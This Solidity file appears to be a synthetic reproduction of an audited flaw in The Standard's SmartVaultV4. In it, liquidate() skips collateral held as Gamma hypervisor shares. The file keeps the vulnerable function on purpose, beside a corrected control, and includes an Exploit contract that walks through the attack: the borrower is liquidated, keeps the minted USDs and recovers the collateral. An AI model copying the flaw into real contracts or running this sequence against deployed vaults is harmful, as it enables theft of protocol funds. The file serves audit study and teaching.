// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  The Standard SmartVaultV4 — Gamma collateral skipped by liquidate
    (Cyfrin / Immeas, AuditVault 38333).
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: liquidate() walks TokenManager.getAcceptedTokens() only.
    Hypervisor (Gamma vault) shares sit on the smart vault and are never
    transferred to the protocol. minted is then zeroed, so the borrower
    withdraws that collateral and keeps the USDs. The control seizes the
    same share balance. Vulnerable liquidate body is the audited code. */

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
}

interface ITokenManager {
    struct Token {
        bytes32 symbol;
        address addr;
        uint8 dec;
        address clAddr;
        uint8 clDec;
    }

    function getAcceptedTokens() external view returns (Token[] memory);
    function getToken(bytes32 symbol) external view returns (Token memory);
}

interface ISmartVaultManagerV3 {
    function tokenManager() external view returns (address);
    function protocol() external view returns (address);
    function HUNDRED_PC() external view returns (uint256);
    function collateralRate() external view returns (uint256);
    function mintFeeRate() external view returns (uint256);
    function weth() external view returns (address);
    function yieldManager() external view returns (address);
}

interface IPriceCalculator {
    function tokenToUSD(ITokenManager.Token memory token, uint256 amount) external view returns (uint256);
}

interface IUSDs {
    function mint(address to, uint256 amount) external;
}

interface IHypervisor {
    function balanceOf(address) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function getTotalAmounts() external view returns (uint256 total0, uint256 total1);
    function token0() external view returns (address);
    function token1() external view returns (address);
}

interface ISmartVaultYieldManager {
    function deposit(address token, uint256 stablePercentage) external returns (address, address);
    function withdraw(address hypervisor, address token) external;
}

interface IWETH {
    function deposit() external payable;
    function withdraw(uint256) external;
}

contract ERC20 {
    function decimals() public pure returns (uint8) {
        return 18;
    }
}

library SafeERC20 {
    function safeTransfer(IERC20 token, address to, uint256 amount) internal {
        require(token.transfer(to, amount), "transfer");
    }

    function safeApprove(IERC20 token, address spender, uint256 amount) internal {
        require(token.approve(spender, amount), "approve");
    }
}

contract MockERC20 is IERC20 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    address public minter;

    function setMinter(address m) external {
        minter = m;
    }

    function mint(address to, uint256 amount) external {
        if (minter != address(0)) require(msg.sender == minter, "minter");
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/// Gamma hypervisor share token. One share is one WETH of underlying.
contract MockHypervisor {
    MockERC20 public immutable wethToken;
    address public immutable token1Addr;
    address public operator;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply;

    constructor(address weth, address token1_) {
        wethToken = MockERC20(weth);
        token1Addr = token1_;
    }

    function setOperator(address op) external {
        operator = op;
    }

    function token0() external view returns (address) {
        return address(wethToken);
    }

    function token1() external view returns (address) {
        return token1Addr;
    }

    function getTotalAmounts() external view returns (uint256 total0, uint256 total1) {
        total0 = wethToken.balanceOf(address(this));
        total1 = 0;
    }

    function mint(address to, uint256 amount) external {
        require(msg.sender == operator, "op");
        totalSupply += amount;
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function redeem(address to, uint256 shares) external {
        require(msg.sender == operator, "op");
        uint256 supply = totalSupply;
        uint256 out = shares * wethToken.balanceOf(address(this)) / supply;
        totalSupply = supply - shares;
        balanceOf[msg.sender] -= shares;
        require(wethToken.transfer(to, out), "weth");
    }
}

contract ProtocolTreasury {}

contract Router {
    uint256 public constant HUNDRED_PC = 10000;
    uint256 public constant collateralRate = 11000;
    MockERC20 public immutable wethErc;
    MockHypervisor public immutable hyp;
    ProtocolTreasury public immutable sink;
    ITokenManager.Token internal accepted;
    SmartVaultV4 public vault;
    uint256 public price;

    constructor(address weth_, address hyp_, address sink_) {
        wethErc = MockERC20(weth_);
        hyp = MockHypervisor(hyp_);
        sink = ProtocolTreasury(sink_);
        accepted = ITokenManager.Token({
            symbol: bytes32("WETH"),
            addr: weth_,
            dec: 18,
            clAddr: address(0),
            clDec: 8
        });
        price = 2e18;
    }

    function setVault(SmartVaultV4 v) external {
        vault = v;
    }

    function setPrice(uint256 p) external {
        price = p;
    }

    function tokenManager() external view returns (address) {
        return address(this);
    }

    function protocol() external view returns (address) {
        return address(sink);
    }

    function mintFeeRate() external pure returns (uint256) {
        return 0;
    }

    function weth() external view returns (address) {
        return address(wethErc);
    }

    function yieldManager() external view returns (address) {
        return address(this);
    }

    function getAcceptedTokens() external view returns (ITokenManager.Token[] memory tokens) {
        tokens = new ITokenManager.Token[](1);
        tokens[0] = accepted;
    }

    function getToken(bytes32 symbol) external view returns (ITokenManager.Token memory) {
        require(symbol == accepted.symbol, "token");
        return accepted;
    }

    function tokenToUSD(ITokenManager.Token memory, uint256 amount) external view returns (uint256) {
        return amount * price / 1e18;
    }

    function deposit(address token, uint256) external returns (address, address) {
        uint256 bal = IERC20(token).balanceOf(msg.sender);
        require(IERC20(token).transferFrom(msg.sender, address(hyp), bal), "pull");
        hyp.mint(msg.sender, bal);
        return (address(hyp), address(0));
    }

    function withdraw(address, address) external {
        uint256 shares = hyp.balanceOf(msg.sender);
        require(hyp.transferFrom(msg.sender, address(this), shares), "shares");
        hyp.redeem(msg.sender, shares);
    }

    function liquidateVault() external {
        vault.liquidate();
    }

    function liquidateVaultCountingYield() external {
        vault.liquidateCountingYield();
    }
}

contract SmartVaultV4 {
    using SafeERC20 for IERC20;

    bytes32 private immutable NATIVE;
    address public immutable manager;
    IUSDs public immutable USDs;
    IPriceCalculator public immutable calculator;
    address[] private hypervisors;

    address public owner;
    uint256 public minted;
    bool public liquidated;

    event CollateralRemoved(bytes32 symbol, uint256 amount, address to);
    event USDsMinted(address to, uint256 amount, uint256 fee);

    error InvalidUser();
    error NotUndercollateralised();
    error Undercollateralised();
    error InvalidToken();
    error TransferError();

    constructor(bytes32 native_, address manager_, address owner_, address usds_, address calculator_) {
        NATIVE = native_;
        owner = owner_;
        manager = manager_;
        USDs = IUSDs(usds_);
        calculator = IPriceCalculator(calculator_);
    }

    modifier onlyVaultManager() {
        if (msg.sender != manager) revert InvalidUser();
        _;
    }

    modifier onlyOwner() {
        if (msg.sender != owner) revert InvalidUser();
        _;
    }

    modifier ifNotLiquidated() {
        if (liquidated) revert NotUndercollateralised();
        _;
    }

    function getTokenManager() private view returns (ITokenManager) {
        return ITokenManager(ISmartVaultManagerV3(manager).tokenManager());
    }

    function yieldVaultCollateral(ITokenManager.Token[] memory _acceptedTokens) private view returns (uint256 _usds) {
        for (uint256 i = 0; i < hypervisors.length; i++) {
            IHypervisor _Hypervisor = IHypervisor(hypervisors[i]);
            uint256 _balance = _Hypervisor.balanceOf(address(this));
            if (_balance > 0) {
                uint256 _totalSupply = _Hypervisor.totalSupply();
                (uint256 _underlyingTotal0, uint256 _underlyingTotal1) = _Hypervisor.getTotalAmounts();
                address _token0 = _Hypervisor.token0();
                address _token1 = _Hypervisor.token1();
                uint256 _underlying0 = _balance * _underlyingTotal0 / _totalSupply;
                uint256 _underlying1 = _balance * _underlyingTotal1 / _totalSupply;
                if (_token0 == address(USDs) || _token1 == address(USDs)) {
                    _usds += _underlying0 * 10 ** (18 - ERC20(_token0).decimals());
                    _usds += _underlying1 * 10 ** (18 - ERC20(_token1).decimals());
                } else {
                    for (uint256 j = 0; j < _acceptedTokens.length; j++) {
                        ITokenManager.Token memory _token = _acceptedTokens[j];
                        if (_token.addr == _token0) _usds += calculator.tokenToUSD(_token, _underlying0);
                        if (_token.addr == _token1) _usds += calculator.tokenToUSD(_token, _underlying1);
                    }
                }
            }
        }
    }

    function usdCollateral() private view returns (uint256 _usds) {
        ITokenManager tokenManager = ITokenManager(ISmartVaultManagerV3(manager).tokenManager());
        ITokenManager.Token[] memory acceptedTokens = tokenManager.getAcceptedTokens();
        for (uint256 i = 0; i < acceptedTokens.length; i++) {
            ITokenManager.Token memory _token = acceptedTokens[i];
            _usds += calculator.tokenToUSD(_token, getAssetBalance(_token.addr));
        }
        _usds += yieldVaultCollateral(acceptedTokens);
    }

    function maxMintable(uint256 _collateral) private view returns (uint256) {
        return _collateral * ISmartVaultManagerV3(manager).HUNDRED_PC() / ISmartVaultManagerV3(manager).collateralRate();
    }

    function getAssetBalance(address _tokenAddress) private view returns (uint256 amount) {
        return _tokenAddress == address(0) ? address(this).balance : IERC20(_tokenAddress).balanceOf(address(this));
    }

    function collateralUsd() external view returns (uint256) {
        return usdCollateral();
    }

    function maxMintableUsd() external view returns (uint256) {
        return maxMintable(usdCollateral());
    }

    function undercollateralised() public view returns (bool) {
        return minted > maxMintable(usdCollateral());
    }

    function liquidateNative() private {
        if (address(this).balance != 0) {
            (bool sent,) = payable(ISmartVaultManagerV3(manager).protocol()).call{value: address(this).balance}("");
            if (!sent) revert TransferError();
        }
    }

    function liquidateERC20(IERC20 _token) private {
        if (_token.balanceOf(address(this)) != 0) {
            _token.safeTransfer(ISmartVaultManagerV3(manager).protocol(), _token.balanceOf(address(this)));
        }
    }

    function liquidate() external onlyVaultManager {
        if (!undercollateralised()) revert NotUndercollateralised();
        liquidated = true;
        minted = 0;
        liquidateNative();
        ITokenManager.Token[] memory tokens =
            ITokenManager(ISmartVaultManagerV3(manager).tokenManager()).getAcceptedTokens();
        // @> VULN: accepted-token loop never seizes Gamma hypervisor shares held by this vault.
        for (uint256 i = 0; i < tokens.length; i++) {
            if (tokens[i].symbol != NATIVE) liquidateERC20(IERC20(tokens[i].addr));
        }
    }

    /// Control: same liquidation, then the hypervisor balances are protocol assets.
    function liquidateCountingYield() external onlyVaultManager {
        if (!undercollateralised()) revert NotUndercollateralised();
        liquidated = true;
        minted = 0;
        liquidateNative();
        ITokenManager.Token[] memory tokens =
            ITokenManager(ISmartVaultManagerV3(manager).tokenManager()).getAcceptedTokens();
        for (uint256 i = 0; i < tokens.length; i++) {
            if (tokens[i].symbol != NATIVE) liquidateERC20(IERC20(tokens[i].addr));
        }
        for (uint256 j = 0; j < hypervisors.length; j++) {
            uint256 shares = IERC20(hypervisors[j]).balanceOf(address(this));
            if (shares != 0) {
                IERC20(hypervisors[j]).safeTransfer(ISmartVaultManagerV3(manager).protocol(), shares);
            }
        }
    }

    function canRemoveCollateral(ITokenManager.Token memory _token, uint256 _amount) private view returns (bool) {
        if (minted == 0) return true;
        uint256 usdValueToRemove = calculator.tokenToUSD(_token, _amount);
        uint256 _newCollateral = usdCollateral() - usdValueToRemove;
        return maxMintable(_newCollateral) >= minted;
    }

    function removeCollateral(bytes32 _symbol, uint256 _amount, address _to) external onlyOwner {
        ITokenManager.Token memory token = getTokenManager().getToken(_symbol);
        if (!canRemoveCollateral(token, _amount)) revert Undercollateralised();
        IERC20(token.addr).safeTransfer(_to, _amount);
        emit CollateralRemoved(_symbol, _amount, _to);
    }

    function fullyCollateralised(uint256 _amount) private view returns (bool) {
        return minted + _amount <= maxMintable(usdCollateral());
    }

    function mint(address _to, uint256 _amount) external onlyOwner ifNotLiquidated {
        uint256 fee = _amount * ISmartVaultManagerV3(manager).mintFeeRate() / ISmartVaultManagerV3(manager).HUNDRED_PC();
        if (!fullyCollateralised(_amount + fee)) revert Undercollateralised();
        minted = minted + _amount + fee;
        USDs.mint(_to, _amount);
        USDs.mint(ISmartVaultManagerV3(manager).protocol(), fee);
        emit USDsMinted(_to, _amount, fee);
    }

    function getToken(bytes32 _symbol) private view returns (ITokenManager.Token memory _token) {
        ITokenManager.Token[] memory tokens = ITokenManager(ISmartVaultManagerV3(manager).tokenManager()).getAcceptedTokens();
        for (uint256 i = 0; i < tokens.length; i++) {
            if (tokens[i].symbol == _symbol) _token = tokens[i];
        }
        if (_token.symbol == bytes32(0)) revert InvalidToken();
    }

    function getTokenisedAddr(bytes32 _symbol) private view returns (address) {
        ITokenManager.Token memory _token = getToken(_symbol);
        return _token.addr == address(0) ? ISmartVaultManagerV3(manager).weth() : _token.addr;
    }

    function addUniqueHypervisor(address _hypervisor) private {
        for (uint256 i = 0; i < hypervisors.length; i++) {
            if (hypervisors[i] == _hypervisor) return;
        }
        hypervisors.push(_hypervisor);
    }

    function removeHypervisor(address _hypervisor) private {
        for (uint256 i = 0; i < hypervisors.length; i++) {
            if (hypervisors[i] == _hypervisor) {
                hypervisors[i] = hypervisors[hypervisors.length - 1];
                hypervisors.pop();
            }
        }
    }

    function significantCollateralDrop(uint256 _preCollateralValue, uint256 _postCollateralValue)
        private
        pure
        returns (bool)
    {
        return _postCollateralValue < 9 * _preCollateralValue / 10;
    }

    function depositYield(bytes32 _symbol, uint256 _stablePercentage) external onlyOwner {
        if (_symbol == NATIVE) IWETH(ISmartVaultManagerV3(manager).weth()).deposit{value: address(this).balance}();
        address _token = getTokenisedAddr(_symbol);
        uint256 _balance = getAssetBalance(_token);
        if (_balance == 0) revert InvalidToken();
        IERC20(_token).safeApprove(ISmartVaultManagerV3(manager).yieldManager(), _balance);
        uint256 _preDepositCollateral = usdCollateral();
        (address _hypervisor1, address _hypervisor2) =
            ISmartVaultYieldManager(ISmartVaultManagerV3(manager).yieldManager()).deposit(_token, _stablePercentage);
        addUniqueHypervisor(_hypervisor1);
        if (_hypervisor2 != address(0)) addUniqueHypervisor(_hypervisor2);
        if (undercollateralised() || significantCollateralDrop(_preDepositCollateral, usdCollateral())) {
            revert Undercollateralised();
        }
    }

    function withdrawYield(address _hypervisor, bytes32 _symbol) external onlyOwner {
        address _token = getTokenisedAddr(_symbol);
        IERC20(_hypervisor).safeApprove(
            ISmartVaultManagerV3(manager).yieldManager(), IERC20(_hypervisor).balanceOf(address(this))
        );
        uint256 _preWithdrawCollateral = usdCollateral();
        ISmartVaultYieldManager(ISmartVaultManagerV3(manager).yieldManager()).withdraw(_hypervisor, _token);
        removeHypervisor(_hypervisor);
        if (_symbol == NATIVE) {
            IWETH(_token).withdraw(getAssetBalance(_token));
        }
        if (undercollateralised() || significantCollateralDrop(_preWithdrawCollateral, usdCollateral())) {
            revert Undercollateralised();
        }
    }

    receive() external payable {}
}

contract System {
    MockERC20 public weth;
    MockERC20 public usds;
    MockHypervisor public hyp;
    ProtocolTreasury public sink;
    Router public router;
    SmartVaultV4 public vault;

    constructor(address owner) {
        weth = new MockERC20();
        usds = new MockERC20();
        hyp = new MockHypervisor(address(weth), address(0xBEEF));
        sink = new ProtocolTreasury();
        router = new Router(address(weth), address(hyp), address(sink));
        vault = new SmartVaultV4(bytes32("ETH"), address(router), owner, address(usds), address(router));
        router.setVault(vault);
        usds.setMinter(address(vault));
        hyp.setOperator(address(router));
    }
}

contract Exploit {
    uint256 public constant GAMMA_COLLATERAL = 1000 ether;
    uint256 public constant DEBT = 1800 ether;

    MockERC20 public weth;
    MockERC20 public usds;
    MockHypervisor public hyp;
    ProtocolTreasury public sink;
    Router public router;
    SmartVaultV4 public vault;

    uint256 public collateralAtCrash;
    uint256 public maxMintableAtCrash;
    uint256 public seizedShares;
    uint256 public sharesLeftOnVault;
    uint256 public borrowerWeth;
    uint256 public borrowerUsds;
    bool public wasLiquidatable;

    constructor() {
        System s = new System(address(this));
        weth = s.weth();
        usds = s.usds();
        hyp = s.hyp();
        sink = s.sink();
        router = s.router();
        vault = s.vault();
    }

    function run() external {
        weth.mint(address(this), GAMMA_COLLATERAL);
        weth.transfer(address(vault), GAMMA_COLLATERAL);
        vault.depositYield(bytes32("WETH"), 0);
        vault.mint(address(this), DEBT);
        router.setPrice(1 ether);
        collateralAtCrash = vault.collateralUsd();
        maxMintableAtCrash = vault.maxMintableUsd();
        wasLiquidatable = vault.undercollateralised();
        require(collateralAtCrash == GAMMA_COLLATERAL, "gamma collateral");
        require(wasLiquidatable, "should be liquidated");
        require(DEBT > maxMintableAtCrash, "debt above cap");
        router.liquidateVault();
        seizedShares = hyp.balanceOf(address(sink));
        sharesLeftOnVault = hyp.balanceOf(address(vault));
        require(seizedShares == 0, "seized the gamma shares");
        require(sharesLeftOnVault == GAMMA_COLLATERAL, "gamma position was liquidated");
        require(weth.balanceOf(address(sink)) == 0, "protocol took weth");
        require(vault.minted() == 0, "debt not wiped");
        require(vault.liquidated(), "flag");
        vault.withdrawYield(address(hyp), bytes32("WETH"));
        vault.removeCollateral(bytes32("WETH"), GAMMA_COLLATERAL, address(this));
        borrowerWeth = weth.balanceOf(address(this));
        borrowerUsds = usds.balanceOf(address(this));
        require(borrowerWeth == GAMMA_COLLATERAL, "collateral not recovered");
        require(borrowerUsds == DEBT, "usds not kept");
    }
}
